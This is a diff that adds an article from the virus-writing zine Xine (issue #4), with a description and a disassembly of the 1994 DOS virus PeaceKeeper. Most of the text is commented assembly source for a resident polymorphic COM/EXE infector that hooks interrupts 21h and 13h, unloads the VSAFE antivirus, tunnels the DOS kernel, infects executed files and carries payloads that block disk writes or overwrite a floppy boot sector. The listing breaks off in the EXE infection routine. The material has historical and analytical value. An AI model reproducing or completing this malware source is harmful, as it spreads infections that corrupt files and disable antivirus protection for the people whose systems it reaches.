@@ -1,0 +1,4669 @@
+
+                                        /-----------------------------\
+                                        | Xine - issue #4 - Phile 308 |
+                                        \-----------------------------/
+
+Virus Name	: PeaceKeeper
+Virus Author	: Doctor Revenge
+Origin		: Italy, May 1994
+Type		: Poly TSR COM/EXE infector
+Disasm		: Darkman/29A and b0z0/iKX
+
+General Description:
+ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+ This is a quite old resident polymorphic COM and EXE infector from Doctor
+Revenge, a well known italian virus writer. For today's starndards is a quite
+'normal' virus, but it has some interesting features, expecially if we consider
+that it was written more than 4 years ago.
+ At loading the virus has some usual antidebugger routines again INT 01h
+debuggers and will unload VSAFE from memory if it is present. With a usual
+kernel scanning routine it will try to search the original entry point of
+the interrupt 21h (depending on DOS version it will use a different string
+for kernel scanning, but in reality all the scan strings are just the same).
+Both interrupt 21h (for file infection and stealth) and interrupt 13h will be
+hooked after going resident by shrinking the last MCB.
+ While resident the virus will intecepts calls to interrupt 21h 11h/12h, this
+is FCB findfirst and findnext and will stealth virus size when needed. It will
+intercept execute function 4b00h too and will try to infect file being executed.
+File type is determined by the file extension and only files ending in COM and
+EXE are examined as infectables. The first two chars of the file name are
+checked against a virus table containing antivirus programs beginning chars and
+such. If such a program is encountered then the virus will skip infection. EXE
+infection is done in a quite usual way with the usual checks aimed to prevent
+destroying the file (like check for Windows executable). What is undoubtely more
+interesting is the COM infection. Peacekeeper infact will put some chunks
+(from a minimal of 2 chunks to 5 chunks randomly) of garbage code (generated
+with the garbage generator of the poly) through the COM file connected with
+absolute JMPs that will then lead to the real decryptor. This way just examining
+the entry point of the virus couldn't be enough to get the virus entry point.
+Of course the original pieces of code that will be overwritten by the virus
+garbage will be saved (encrypted) for later restoration (with each chunk will
+be saved also its lenght and the position of the chunk in the file). The virus
+is slow polymorphic in both COMs and EXEs. Infact the poly engine input register
+with flags (BL) is initialized depending on disk serial number or on system date
+if DOS version is smaller than 4. So even if the garbage in the decryptor will
+be random at each infection, the basic structure of the decryptor (pointer used,
+type of encryption and such) is fixed for all files infected on a system.
+ The virus has also two payloads. When virus is not in its infection stage
+it could randomly inhibit writing to disk (as for writes that are done with
+function 3 of the interrupt 13h). While depending on a random value it could
+change the original boot sector of a floppy disk with a virus boot record
+that displays the virus message. But due to a bug this second payload will
+never get activated.
+
+
+MCG 0.31b Description:
+ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+ The poly engine used in this virus is the MCG 0.31b. The poly itself is quite
+simple (but it wasn't for the times the virus was actually written). It
+generates decryptors that can use ADD/SUB/XOR math operations on either bytes
+or words with a fixed encryption key as immediate. The counter register is
+fixed to CX, while the pointer can be either SI or DI, that can be also
+associated with a fixed offset (ie. [DI + 100h]). There are two ways to create
+the loop check for the decryptor, using a LOOP instruction or by just using
+the DEC CX with a counter check. It is interesting that most of the exact
+structure of the decryptor is already decided at the poly calling time in the
+register with decryptor flags, this is BL.
+ Most of the poly is written using tables. The assignation of the registers
+infact (counter and pointer one) is done by selecting one of the four
+possible constructs from an offset table that are quite simillar and have
+all the same task to assign a given value to the given register (look at
+comments in code for the exact structure of each of this code blocks). As for
+the incrementation of the pointer there are a few possibile ways to do the
+work, depending on the used register infact a SCASB or CMPSB (or word if
+encrypting by words) could be used instead of the more usual INC.
+ As for garbage there are 7 different types of garbage generation routines
+(tables are used here aswell) that generate usual one byte instructions,
+some assignment and logical instructions, conditional jumps and comparations
+between registers or between a register and an immediate. Garbage instruction
+can be either 16bit or 8bit ones. All the garbage generated doesn't affect in
+any way any of the registers (infact only logical operations between the
+register and itself like OR and AND are used), except flags, so the poly
+doesn't have to keep reference of which registers must be preserved or which
+registers have been changed during the decryptor. This of course makes the
+garbage generation easier to manage, but on the other side makes the possible
+generated garbage very reduced and generated instructions are not likely ones
+that could be found in a normal program, since they don't act on the registers
+at all.
+
+
+ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[peacek_a.asm]ƒƒ
+.model tiny
+.code
+ org   100h				 ; Origin of PeaceKeeper.a
+
+code_begin:
+stack_ptr    equ     $-01h		 ; Stack pointer
+
+	     call    delta_offset
+delta_offset:
+	     pop     si 		 ; Load SI from stack
+	     sub     si,(delta_offset-code_begin)
+
+	     jmp     int01_store
+	     nop
+
+int13_virus  proc    near		 ; Interrupt 13h of PeaceKeeper.a
+	     cmp     cs:[payload_stat],00h
+	     je      int13_exit 	 ; Equal? Jump to int13_exit
+	     cmp     ah,03h		 ; Write disk sector(s)
+	     je      payload		 ; Equal? Jump to payload
+int13_exit:
+	     jmp     cs:[int13_addr]
+
+	     iret			 ; Interrupt return
+payload:
+	     push    ax bx		 ; Save registers at stack
+	     call    get_rnd_num
+	     and     ah,00000111b	 ; AH = random number within seven
+	     and     al,00000111b	 ; AL =   "      "      "      "
+
+	     cmp     ah,00000111b	 ; Write disk sector(s)?
+	     jne     write_sector	 ; Not equal? Jump to write_sector
+	     cmp     al,00000110b	 ; Write disk sector(s)?
+	     jne     write_sector	 ; Not equal? Jump to write_sector
+	     pop     bx ax		 ; Load registers from stack
+
+	     clc			 ; Clear carry flag
+
+	     iret			 ; Interrupt return
+write_sector:
+	     pop     bx ax		 ; Load registers from stack
+
+	     jmp     int13_exit
+	     endp
+
+int01_virus  proc    near		 ; Interrupt 01h of PeaceKeeper.a
+	     cmp     cs:[si+trace_status-100h],00h
+	     jne     int01_exit 	 ; Not equal? Jump to int01_exit
+
+	     mov     cs:[si+trace_status-100h],01h
+
+	     pushf			 ; Save flags at stack
+	     pop     ax 		 ; Load AX from stack
+	     and     ax,1111111011111111b
+	     push    ax 		 ; Save AX at stack
+	     popf			 ; Load flags from stack
+
+	     jmp     int01_load
+int01_exit:
+	     iret			 ; Interrupt return
+	     endp
+int01_store:
+	     sub     ax,ax		 ; Zero AX
+	     mov     es,ax		 ; ES = segment of interrupt table
+
+	     cli			 ; Clear interrupt-enable flag
+	     mov     dx,es:[(01h*04h)]	 ; Get interrupt vector 01h
+	     mov     cx,es:[(01h*04h+02h)]
+	     sti			 ; Set interrupt-enable flag
+
+	     lea     ax,[si+int01_virus-100h]
+
+	     mov     cs:[si+trace_status-100h],00h
+
+	     mov     es:[(01h*04h)],ax	 ; Set interrupt vector 01h
+	     mov     es:[(01h*04h+02h)],cs
+
+	     pushf			 ; Save flags at stack
+	     pop     ax 		 ; Load AX from stack
+	     or      ax,0000000100000000b
+	     push    ax 		 ; Save AX at stack
+	     popf			 ; Load flags from stack
+
+	     nop
+
+	     int     20h		 ; Terminate program
+int01_load:
+	     cli			 ; Clear interrupt-enable flag
+	     mov     es:[(01h*04h)],dx	 ; Set interrupt vector 01h
+	     mov     es:[(01h*04h+02h)],cx
+	     sti			 ; Set interrupt-enable flag
+
+	     jmp     get_dos_ver
+
+init_rnd_num proc    near		 ; Initialize 32-bit random number
+	     push    cx 		 ; Save CX at stack
+	     call    init_rnd_nu_
+
+	     db      10000011b,11100000b ; AND AX,0Fh (opcode 83h,0e0h,0fh)
+	     db      00001111b
+	     inc     ax 		 ; AX = random number within sixteen
+	     xchg    ax,cx		 ; CX =   "      "      "       "
+calc_rnd_num:
+	     call    get_rnd_num
+
+	     loop    calc_rnd_num
+	     pop     cx 		 ; Load CX from stack
+
+	     ret			 ; Return
+	     endp
+
+init_rnd_nu_ proc    near		 ; Initialize 32-bit random number
+	     push    dx cx		 ; Save registers at stack
+
+	     mov     ah,2ch		 ; Get system time
+	     int     21h
+
+	     in      al,40h		 ; AL = 8-bit random number
+	     mov     ah,al		 ; AH =   "     "      "
+	     in      al,40h		 ; AL =   "     "      "
+
+	     xor     ax,cx		 ; AX = low-order word of 32-bit r...
+	     xor     dx,ax		 ; DX = high-order word of 32-bir ...
+
+	     jmp     sto_rnd_num
+	     endp
+
+get_rnd_num  proc    near		 ; Get 32-bit random number
+	     push    dx cx		 ; Save registers at stack
+	     push    bx 		 ; Save BX at stack
+
+random_num   equ     word ptr $+01h	 ; Low-order word of 32-bit random ...
+	     mov     ax,00h		 ; AX = low-order word of 32-bit ra...
+random_num_  equ     word ptr $+01h	 ; High-order word of 32-bit random...
+	     mov     dx,00h		 ; DX = high-order word of 32-bit r...
+
+	     mov     cx,07h		 ; Rotate 32-bit random number thro...
+calc_rnd_nu_:
+	     shl     ax,01h		 ; Shift logical left low-order wor...
+	     rcl     dx,01h		 ; Rotate left high-order word of 3...
+
+	     mov     bl,al		 ; BL = low-order byte of low-order...
+	     xor     bl,dh		 ; Exclusive OR high-order byte of ...
+	     jns     dont_inc_rnd	 ; No sign? Jump to dont_inc_rnd
+
+	     inc     al 		 ; Increase low-order byte of low-or...
+dont_inc_rnd:
+	     loop    calc_rnd_nu_
+	     pop     bx 		 ; Load BX from stack
+sto_rnd_num:
+	     mov     word ptr cs:[random_num],ax
+	     mov     word ptr cs:[random_num_],dx
+
+	     mov     al,dl		 ; AL = low-order byte of high-orde...
+
+	     pop     cx dx		 ; Load registers from stack
+
+	     ret			 ; Return
+	     endp
+virus_exit:
+	     cmp     [si+execute_stat-100h],00h
+	     je      vir_com_exit	 ; COM executable? Jump to vir_com_...
+	     cmp     [si+execute_stat-100h],01h
+	     je      vir_exe_exit	 ; EXE executable? Jump to vir_exe_...
+eternal_loop:
+	     jmp     eternal_loop
+vir_exe_exit:
+	     mov     ax,[si+program_seg-100h]
+	     mov     ds,ax		 ; DS = segment of Program Segment ...
+	     mov     es,ax		 ; ES =    "    "     "       "     "
+	     mov     dx,ds		 ; DX =    "    "     "       "     "
+
+	     add     dx,10h		 ; DX = segment of beginning of code
+	     mov     cx,dx		 ; CX =    "    "      "     "   "
+	     add     dx,cs:[si+initial_ss-100h]
+
+	     cli			 ; Clear interrupt-enable flag
+	     mov     ss,dx		 ; SS = initial SS relative to star...
+	     mov     sp,cs:[si+initial_sp-100h]
+	     sti			 ; Set interrupt-enable flag
+
+	     add     cx,cs:[si+initial_cs-100h]
+	     push    cx 		 ; Save initial SS relative to star...
+
+	     push    word ptr cs:[si+initial_ip-100h]
+
+	     retf			 ; Return far
+vir_com_exit:
+	     mov     cx,[si+poly_parts-100h]
+	     lea     si,[si+data_buffe-100h]
+
+	     push    cs 		 ; Save CS at stack
+	     pop     es 		 ; Load ES from stack (CS)
+
+	     cld			 ; Clear direction flag
+restore_loop:
+	     push    cx 		 ; Save CX at stack
+	     lodsw			 ; AX = length of original part
+	     mov     cx,ax		 ; CX =   "    "     "      "
+
+	     lodsw			 ; AX = offset "     "      "
+	     mov     di,ax		 ; DI =   "    "     "      "
+	     add     di,100h		 ; Add offset of beginning of code ...
+	     rep     movsb		 ; Move original code to offset of ...
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    restore_loop
+
+	     push    cs 		 ; Save CS at stack
+
+	     mov     ax,100h		 ; AX = offset of beginning of code
+	     push    ax 		 ; Save AX at stack
+
+	     retf			 ; Return far
+error_:
+	     stc			 ; Set carry flag
+
+	     ret			 ; Return
+no_error:
+	     clc			 ; Clear carry flag
+
+	     ret			 ; Return
+
+tunneler     proc    near		 ; Tunneler of PeaceKeeper.a
+	     mov     ah,34h		 ; Get address of InDOS flag
+	     int     21h
+
+	     push    es 		 ; Save ES at stack
+	     mov     ax,[si+dos_version-100h]
+	     sub     ah,ah		 ; AX = major version number
+
+	     sub     bx,bx		 ; Zero BX
+	     mov     bx,03h		 ; BX = DOS version number
+	     mov     cx,04h		 ; Compare four times
+find_dos_ver:
+	     cmp     al,bl		 ; Found DOS version number?
+	     je      found_ver		 ; Equal? Jump to found_ver
+
+	     inc     bl 		 ; Increase DOS version number
+	     inc     ah 		 ; Increase DOS version counter
+	     loop    find_dos_ver
+
+	     jmp     error_
+found_ver:
+	     sub     al,al		 ; Zero AL
+	     xchg    al,ah		 ; AL = DOS version counter
+	     mov     bx,04h		 ; Multiply by four
+	     mul     bx 		 ; AX = DOS version counter multipl...
+	     lea     bx,[si+scan_strings-100h]
+	     add     bx,ax		 ; BX = offset within scan_strings
+	     pop     ax 		 ; Load AX from stack (ES)
+
+	     call    find_kernel
+	     endp
+
+exam_kernel  proc    near		 ; Examine DOS kernel in High Memor...
+	     cmp     dx,[bx]		 ; DOS kernel?
+	     jne     not_kernel 	 ; Not equal? Jump to not_kernel
+
+	     mov     dx,es:[si+02h]	 ; DX = two bytes of DOS data segment
+	     cmp     dx,[bx+02h]	 ; DOS kernel?
+	     jne     not_kernel 	 ; Not equal? Jump to not_kernel
+
+	     jmp     error_
+not_kernel:
+	     jmp     no_error
+	     endp
+
+find_kernel  proc    near		 ; Find DOS kernel in High Memory A...
+	     mov     di,si		 ; DI = delta offset
+	     mov     es,ax		 ; ES = segment of DOS data segment
+	     mov     si,100h		 ; SI = offset of DOS data segment
+	     mov     cx,1388h		 ; Search through five thousand bytes
+find_kernel_:
+	     mov     dx,es:[si] 	 ; DX = two bytes of DOS data segment
+	     cmp     dh,[bx]		 ; DOS kernel?
+	     jne     not_kernel_	 ; Not equal? Jump to not_kernel_
+
+	     call    exam_kernel
+	     jc      found_kernel	 ; Found DOS kernel? Jump to found_...
+not_kernel_:
+	     inc     si 		 ; Increase offset of DOS data segment
+	     loop    find_kernel_
+
+	     jmp     error_
+found_kernel:
+	     mov     word ptr [di+int21_addr-100h],si
+	     mov     word ptr [di+int21_addr-100h+02h],es
+
+	     mov     si,di		 ; SI = delta offset
+
+	     jmp     no_error
+	     endp
+
+	     nop
+get_dos_ver:
+	     mov     ah,30h		 ; Get DOS version
+	     int     21h
+
+	     mov     cs:[si+dos_version-100h],ax
+	     mov     cs:[si+program_seg-100h],ds
+
+	     push    cs 		 ; Save CS at stack
+	     pop     ds 		 ; Load DS from stack
+
+	     mov     bp,si		 ; BP = delta offset
+
+	     mov     ax,0deadh		 ; PeaceKeeper.a function
+	     int     21h
+	     cmp     bx,ax		 ; Already resident?
+	     jne     test_dos_ver	 ; Not equal? Jump to test_dos_ver
+
+	     jmp     virus_exit
+test_dos_ver:
+	     mov     ax,[si+dos_version-100h]
+	     cmp     al,03h		 ; DOS v 3.xx?
+	     jge     test_vsafe 	 ; Greater or equal? Jump to test_v...
+
+	     jmp     virus_exit
+test_vsafe:
+	     mov     ax,0fa00h		 ; PC tools v8+ vsafe, vwatch insta...
+	     mov     dx,5945h		 ; "    "    "    "      "       "
+	     int     16h
+	     cmp     di,4559h		 ; Installed?
+	     jne     get_int_vec	 ; Not equal? Jump to get_int_vec
+
+	     mov     ax,0fa01h		 ; PC tools v8+ vsafe, vwatch unins...
+	     mov     dx,5945h		 ; "    "    "    "      "       "
+	     int     16h
+get_int_vec:
+	     mov     ax,3513h		 ; Get interrupt vector 13h
+	     int     21h
+	     mov     word ptr [si+int13_addr-100h],bx
+	     mov     word ptr [si+int13_addr-100h+02h],es
+
+	     mov     ax,3521h		 ; Get interrupt vector 21h
+	     int     21h
+	     mov     word ptr [si+int21_addr_-100h],bx
+	     mov     word ptr [si+int21_addr-100h],bx
+	     mov     word ptr [si+int21_addr_-100h+02h],es
+	     mov     word ptr [si+int21_addr-100h+02h],es
+
+	     call    tunneler
+
+	     mov     ax,[si+dos_version-100h]
+	     cmp     al,04h		 ; DOS v 4.xx?
+	     jl      get_sys_date	 ; Less? Jump to get_sys_date
+
+	     mov     ax,6900h		 ; Get disk serial number
+	     mov     bl,03h		 ; Drive C:
+	     lea     dx,[si+data_buffer-100h]
+	     int     21h
+
+	     mov     ah,[si+data_buffer+02h-100h]
+	     mov     [si+flags-100h],ah  ; Store flags
+
+	     jmp     examine_mcb
+get_sys_date:
+	     mov     ah,2ah		 ; Get system date
+	     int     21h
+
+	     mov     [si+flags-100h],dh  ; Store flags
+examine_mcb:
+	     mov     bx,[si+program_seg-100h]
+	     dec     bx 		 ; BX = segment of Memory Control B...
+	     mov     es,bx		 ; ES =    "    "    "       "     "
+	     sub     bx,bx		 ; Zero BX
+
+	     cmp     byte ptr es:[bx],'Z'
+	     je      allocate_mem	 ; Equal? Jump to allocate_mem
+
+	     jmp     virus_exit
+allocate_mem:
+	     mov     ax,(data_end-code_begin+0fh)/10h+85h
+	     sub     es:[bx+03h],ax	 ; Subtract size of virus in memory...
+	     sub     es:[bx+12h],ax	 ;    "      "   "    "   "      "
+	     mov     es,es:[bx+12h]	 ; ES = segment of allocated memory...
+
+	     push    si 		 ; Save SI at stack
+	     sub     cx,cx		 ; Zero CX
+	     sub     di,di		 ; Zero DI
+	     or      di,offset code_begin
+	     or      cx,(code_end-code_begin)
+	     rep     movsb		 ; Move virus to top of memory
+	     pop     si 		 ; Load SI from stack
+
+	     mov     ax,2521h		 ; Set interrupt vector 21h
+
+	     push    ds 		 ; Save DS at stack
+	     push    es 		 ; Save ES at stack
+	     pop     ds 		 ; Load DS from stack (ES)
+
+	     lea     dx,int21_virus	 ; DX = offset of int21_virus
+	     int     21h
+
+	     mov     ax,2513h		 ; Set interrupt vector 13h
+	     lea     dx,int13_virus	 ; DX = offset of int13_virus
+	     int     21h
+	     pop     ds
+
+	     mov     ax,0deaeh		 ; PeaceKeeper.a function
+	     int     21h
+
+	     jmp     virus_exit
+
+payload_     proc    near		 ; Payload of PeaceKeeper.a
+	     nop
+
+	     call    get_rnd_num
+	     and     ah,00000111b	 ; AH = random number within seven
+	     and     al,00000011b	 ; AL = random number within three
+
+	     cmp     ah,00000111b	 ; Activate payload?
+	     je      test_random	 ; Equal? Jump to test_random
+
+	     jmp     no_error
+test_random:
+	     cmp     al,00000100b	 ; Activate payload?
+	     je      read_sector	 ; Equal? Jump to read_sector
+
+	     jmp     no_error
+read_sector:
+	     cld			 ; Clear direction flag
+
+	     lea     bx,data_buffe	 ; BX = offset of data_buffe
+	     mov     al,00h		 ; Drive A:
+	     mov     cx,01h		 ; Read one sector
+	     sub     dx,dx		 ; DX = starting logical sector
+	     int     25h		 ; Absolute disk read
+
+	     popf			 ; Load flags from stack
+	     jnc     no_error___	 ; No error? Jump to no_error___
+
+	     jmp     error_
+no_error___:
+	     mov     si,bx		 ; SI = offset of data_buffer
+	     cmp     byte ptr [si],11101011b
+	     je      found_jump 	 ; JMP imm8? (opcode 0ebh)? Jump to...
+
+	     jmp     error_
+found_jump:
+	     push    cs 		 ; Save CS at stack
+	     pop     es 		 ; Load ES from stack (CS)
+
+	     lodsb			 ; JMP imm8 (opcode 0ebh)
+	     lodsb			 ; AL = 8-bit immediate
+	     sub     ah,ah		 ; Zero AH
+	     add     si,ax		 ; SI = offset within sector
+
+	     mov     di,si		 ; DI = offset within sector
+	     lea     si,mbr		 ; SI = offset of mbr
+	     mov     cx,(mbr_end-mbr_begin)
+	     rep     movsb		 ; Move Master Boot Record of Peace...
+
+	     sub     dx,dx		 ; DX = starting logical sector
+	     mov     cx,01h		 ; Read one sector
+	     xor     al,al		 ; Drive A:
+	     lea     bx,data_buffe	 ; BX = offset of data_buffe
+	     int     26h		 ; Absolute disk write
+
+	     popf			 ; Load flags from stack
+	     jnc     no_error____	 ; No error? Jump to no_error____
+
+	     jmp     error_
+no_error____:
+	     jmp     no_error
+	     endp
+mbr_begin:
+mbr	     proc    near		 ; Master Boot Record of PeaceKeeper.a
+	     call    delta_offse
+delta_offse:
+	     pop     bx 		 ; Load BX from stack
+	     sub     bx,(delta_offse-mbr)
+
+	     cli			 ; Clear interrupt-enable flag
+	     cld			 ; Clear direction flag
+	     xor     ax,ax		 ; AX = segment of Master Boot Reco...
+	     mov     ss,ax		 ; SS =    "    "    "     "      "
+	     mov     ds,ax		 ; DS =    "    "    "     "      "
+	     mov     sp,7c00h		 ; SP = offset of Master Boot Recor...
+	     sti			 ; Set interrupt-enable flag
+
+	     mov     ax,0b800h		 ; AX = segment of text video RAM
+	     mov     es,ax		 ; ES =    "    "   "     "    "
+
+	     sub     di,di		 ; Zero DI
+	     mov     ax,1f20h		 ; AX = foreground- and backgroundc...
+	     mov     cx,7d0h		 ; Store four thousand bytes
+store_colors:
+	     stosw			 ; Store foreground- and background...
+
+	     loop    store_colors
+
+	     sub     di,di		 ; Zero DI
+	     mov     si,bx		 ; SI = delta offset
+	     db      10000001b,11000110b ; ADD SI,imm16
+	     dw      (message-mbr)	 ; Offset of message
+	     mov     cx,(message_end-messag_begin)
+store_messag:
+	     lodsb			 ; AL = byte of message
+	     stosb			 ; Store byte of message
+
+	     inc     di 		 ; Increase index register
+
+	     loop    store_messag
+
+	     mov     cx,(message_end_-messag_begi_)
+	     mov     di,0a0h		 ; DI = offset witin text video RAM
+store_messa_:
+	     lodsb			 ; AL = byte of message_
+	     stosb			 ; Store byte of message_
+
+	     inc     di 		 ; Increase index register
+
+	     loop    store_messa_
+eternal_loo:
+	     jmp     eternal_loo
+	     endp
+messag_begin:
+message      db      'Peace-Keeper Virus V2.10 '
+message_end:
+messag_begi_:
+message_     db      'Written by Doctor Revenge 18-May-1994 , Italy'
+message_end_:
+mbr_end:
+examine_name proc    near		 ; Examine filename
+	     mov     si,[filename_off]	 ; SI = offset of filename
+
+	     push    [filename_seg]	 ; Save segment of filename at stack
+	     pop     ds 		 ; Load DS from stack (segment of ...)
+
+	     push    cs 		 ; Save CS at stack
+	     pop     es 		 ; Load ES from stack (CS)
+
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     cx,80h		 ; Examine one hundred and twenty-e...
+upcase_char:
+	     lodsb			 ; AL = byte of filename
+
+	     cmp     al,00h		 ; Found end of filename?
+	     je      examine_ext	 ; Equal? Jump to examine_ext
+
+	     cmp     al,'a'              ; Upcase character?
+	     jb      dont_upcase	 ; Below? Jump to dont_upcase
+	     cmp     al,'z'              ; Upcase character?
+	     ja      dont_upcase	 ; Above? Jump to dont_upcase
+
+	     xor     al,00100000b	 ; Upcase character
+dont_upcase:
+	     stosb			 ; Store byte of filename
+
+	     loop    upcase_char
+examine_ext:
+	     stosb			 ; Store zero
+
+	     mov     si,di		 ; SI = offset of end of filename
+	     dec     si 		 ; SI = offset of last byte in file...
+
+	     std			 ; Set direction flag
+
+	     push    cs cs		 ; Save segments at stack
+	     pop     es ds		 ; Load segments from stack
+find_dot:
+	     lodsb			 ; AL = byte of file extension
+	     cmp     al,'.'              ; Dot?
+	     jne     find_dot		 ; Not equal? Jump to find_dot
+
+	     cld			 ; Clear direction flag
+
+	     inc     si 		 ; SI = offset of file extension
+	     inc     si 		 ; "  "   "    "   "       "
+	     mov     ax,si		 ; AX =   "    "   "       "
+
+	     lea     di,exe_extensio	 ; DI = offset of exe_extensio
+	     mov     cx,03h		 ; Compare three bytes
+	     rep     cmpsb		 ; EXE extension?
+	     jne     examine_ext_	 ; Not equal? Jump to examine_ext_
+
+	     mov     [execute_stat],01h  ; EXE executable
+
+	     jmp     examine_nam_
+examine_ext_:
+	     lea     di,com_extensio	 ; DI = offset of com_extensio
+	     mov     si,ax		 ; SI = offset of file extension
+	     mov     cx,03h		 ; Compare three bytes
+	     rep     cmpsb		 ; COM extension?
+	     je      found_ext		 ; Equal? Jump to found_ext
+
+	     jmp     error_
+found_ext:
+	     mov     [execute_stat],00h  ; COM executable
+examine_nam_:
+	     std			 ; Set direction flag
+	     mov     cx,0fh		 ; Search through fifteen bytes
+find_begin:
+	     lodsb			 ; AL = byte of filename
+
+	     cmp     al,':'              ; Found beginning of filename?
+	     je      compare_name	 ; Equal? Jump to compare_name
+	     cmp     al,'\'              ; Found beginning of filename?
+	     je      compare_name	 ; Equal? Jump to compare_name
+
+	     loop    find_begin
+
+	     jmp     error_
+compare_name:
+	     inc     si 		 ; SI = offset of beginning of file...
+	     inc     si 		 ; "  "   "    "      "     "     "
+
+	     cld			 ; Clear direction flag
+	     lodsw			 ; AX = first two bytes of filename
+	     lea     di,name_table	 ; DI = offset of name_table
+	     mov     cx,(table_end_-table_begin_)/02h
+	     repne   scasw		 ; Found filename?
+	     jne     found_name 	 ; Not equal? Jump to found_name
+
+	     jmp     error_
+found_name:
+	     jmp     no_error
+	     endp
+
+open_file    proc    near		 ; Open file
+	     push    ds 		 ; Save DS at stack
+	     mov     dx,[filename_off]	 ; DX = offset of filename
+	     mov     ds,[filename_seg]	 ; DS = segment of filename
+
+	     mov     ax,3d02h		 ; Open file (read/write)
+	     call    int21_simula
+	     pop     ds 		 ; Load DS from stack
+	     jnc     no_error_		 ; No error? Jump to no_error_
+
+	     jmp     error_
+no_error_:
+	     mov     [file_handle],ax	 ; Store file handle
+
+	     jmp     no_error
+	     endp
+
+close_file   proc    near		 ; Close file
+	     mov     ah,3eh		 ; Close file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+sto_file_att proc    near		 ; Get and set file attributes
+	     push    ds 		 ; Save DS at stack
+	     mov     dx,[filename_off]	 ; DX = offset of filename
+	     mov     ds,[filename_seg]	 ; DS = segment of filename
+
+	     mov     ax,4300h		 ; Get file attributes
+	     call    int21_simula
+	     mov     cs:[file_attr],cx	 ; Store file attributes
+
+	     xor     cx,cx		 ; CX = new file attributes
+	     mov     ax,4301h		 ; Set file attributes
+	     call    int21_simula
+	     pop     ds 		 ; Load DS from stack
+	     jnc     no_error__ 	 ; No error? Jump to no_error__
+
+	     jmp     error_
+no_error__:
+
+	     jmp     no_error
+	     endp
+
+get_file_inf proc    near		 ; Get file's date and time
+	     mov     ax,5700h		 ; Get file's date and time
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     mov     [file_date],dx	 ; Store file date
+	     mov     [file_time],cx	 ; Store file time
+
+	     jmp     no_error
+	     endp
+
+set_file_inf proc    near		 ; Set file's date and time
+	     mov     ax,5701h		 ; Set file's date and time
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,[file_time]	 ; CX = file time
+	     mov     dx,[file_date]	 ; DX = file date
+
+	     cmp     [infect_stat],00h	 ; Don't infect file?
+	     jne     dont_infect	 ; Not equal? Jump to dont_infect
+
+	     or      cl,00011111b	 ; Set infection mark (60 seconds)
+	     and     cl,11111110b	 ;  "      "      "     "    "
+dont_infect:
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+int24_store  proc    near		 ; Get and set interrupt vector 24h
+	     push    es 		 ; Save ES at stack
+	     sub     ax,ax		 ; Zero AX
+	     mov     es,ax		 ; ES = segment of interrupt table
+
+	     mov     ax,es:[(24h*04h)]	 ; Set interrupt vector 24h
+	     mov     es:[(24h*04h)],offset int24_virus
+	     mov     word ptr [int24_addr],ax
+
+	     mov     ax,es:[(24h*04h+02h)]
+	     mov     es:[(24h*04h+02h)],cs
+	     mov     word ptr [int24_addr+02h],ax
+	     pop     es 		 ; Save ES at stack
+
+	     jmp     no_error
+	     endp
+
+int24_load   proc    near		 ; Set interrupt vector 24h
+	     push    es 		 ; Save ES at stack
+	     sub     bx,bx		 ; Zero BX
+
+	     push    bx 		 ; Save BX at stack
+	     pop     es 		 ; Load ES from stack
+
+	     mov     ax,word ptr [int24_addr]
+	     mov     es:[(24h*04h)],ax	 ; Set interrupt vector 24h
+
+	     mov     ax,word ptr [int24_addr+02h]
+	     mov     es:[(24h*04h+02h)],ax
+	     pop     es 		 ; Load ES from stack
+
+	     jmp     no_error
+	     endp
+
+set_file_pos proc    near		 ; Set current file position
+	     push    cx bx		 ; Save registers at stack
+	     mov     ah,42h		 ; Set current file position
+	     sub     cx,cx		 ; CX:DX = offset from origin of ne...
+	     mov     dx,cx		 ;   "   "   "     "     "    "    "
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     pop     bx cx		 ; Load registers from stack
+
+	     jmp     no_error
+	     endp
+
+div_by_pages proc    near		 ; Divide by pages
+	     mov     cx,200h		 ; Divide by pages
+	     div     cx 		 ; DX:AX = filesize in pages
+
+	     or      dx,dx		 ; No bytes in last 512-bytes page ...
+	     jz      dont_inc_pag	 ; Zero? Jump to dont_inc_pag
+
+	     inc     ax 		 ; Increase total number of 512-byt...
+dont_inc_pag:
+	     ret
+	     endp
+
+get_filesize proc    near		 ; Get filesize
+	     mov     ax,word ptr [filesize]
+	     mov     dx,word ptr [filesize+02h]
+
+	     ret			 ; Return
+	     endp
+
+infect_exe   proc    near		 ; Infect EXE file
+	     mov     [infect_stat],01h	 ; Infect file
+
+	     mov     al,00h		 ; Set current file position (SOF)
+	     call    set_file_pos
+
+	     mov     ah,3fh		 ; Read from file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,1ch		 ; Read twenty-eight bytes
+	     lea     dx,data_buffer	 ; DX = offset of data_buffer
+	     call    int21_simula
+
+	     lea     si,data_buffer	 ; SI = offset of data_buffer
+	     cmp     word ptr [si],'ZM'  ; Found EXE signature
+	     je      exam_header	 ; Equal? Jump to exam_header
+
+	     jmp     error_
+exam_header:
+	     cmp     word ptr [si+12h],0deadh
+	     jne     exam_header_	 ; Already infected? Jump to exam_h...
+
+	     jmp     error_
+exam_header_:
+	     cmp     word ptr [si+18h],40h
+	     jb      test_overlay	 ; New executable? Jump to test_overlay
+
+	     sub     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,3ch		 ; DX = offset of new executable he...
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     jnc     read_header	 ; No error? Jump to read_header
+
+	     jmp     error_
+read_header:
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,04h		 ; Read four bytes
+	     lea     dx,data_buffer_	 ; DX = offset of data_buffer_
+	     call    int21_simula
+	     jnc     read_offset	 ; No error? Jump to read_offset
+
+	     jmp     error_
+read_offset:
+	     mov     dx,word ptr [data_buffer_]
